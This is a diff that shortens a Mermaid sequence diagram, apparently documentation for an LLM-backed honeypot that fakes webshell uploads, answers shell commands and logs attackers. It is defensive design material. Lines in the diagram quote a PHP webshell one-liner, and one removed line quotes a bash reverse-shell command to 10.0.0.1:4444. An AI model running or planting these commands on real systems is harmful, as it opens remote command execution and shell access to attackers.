@@ -56,33 +56,33 @@ flowchart TD
 sequenceDiagram
     participant A as Attacker
     participant H as Honeypot
-    participant RAG as Shell RAG Engine
+    participant RAG as Shell RAG
     participant G as Gemini LLM
     participant I as Intel Engine
 
     A->>H: GET /clientportal/support/attachments.php
     H->>I: record_form_view(ip)
-    H-->>A: Realistic PHP upload form (fake Apache headers)
+    H-->>A: Realistic PHP form
 
-    A->>H: POST /clientportal/support/attachments.php<br/>file=shell.php (<?php system($_GET['cmd']); ?>)
-    H->>I: record_upload(ip, file, bytes)
-    Note over H: Detects webshell patterns<br/>Registers filename in _shell_registry<br/>File NEVER written to disk
-    H-->>A: Upload success + /uploads/shell.php URL
+    Note right of A: POST shell.php<br/>&lt;?php system($_GET['cmd']); ?&gt;
+    H->>I: record_upload(ip,file)
+    Note over H: Detects webshell<br/>No disk write
+    H-->>A: Upload success URL
 
     A->>H: GET /uploads/shell.php?cmd=whoami
-    H->>I: record_webshell_access(ip, cmd)
-    H->>RAG: resolve_shell_command("whoami")
-    Note over RAG: 1. Exact cache (ground-truth)<br/>2. Case-insensitive match<br/>3. Dynamic handler<br/>4. TF-IDF fuzzy (Cowrie dataset)<br/>5. Gemini LLM (cached per session)<br/>6. bash error fallback
-    RAG-->>H: "www-data"
+    H->>I: record_webshell_access(ip,cmd)
+    H->>RAG: resolve_shell_command(whoami)
+    Note over RAG: Cache > TF-IDF > LLM fallback
+    RAG-->>H: www-data
     H-->>A: www-data
 
-    A->>H: GET /uploads/shell.php?cmd=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
-    H->>I: record_webshell_access(ip, revshell_cmd)
-    Note over H: Simulates hang (1.5s delay, empty response)<br/>Fully logged as POST_EXPLOIT phase
-    H-->>A: (empty — simulated timeout)
+    Note right of A: Revshell cmd example
+    H->>I: record_revshell(ip)
+    Note over H: Simulate hang (1.5s empty)
+    H-->>A: (timeout)
 
-    A->>H: GET /api/dashboard/cve/file-upload/attacker/10.0.0.1
-    Note over H: Returns full attacker profile:<br/>geo, phase, risk scores, deception advice
+    A->>H: GET /api/dashboard/.../attacker/IP
+    Note over H: Full profile: geo/phase/risk
 ```
 
 ---
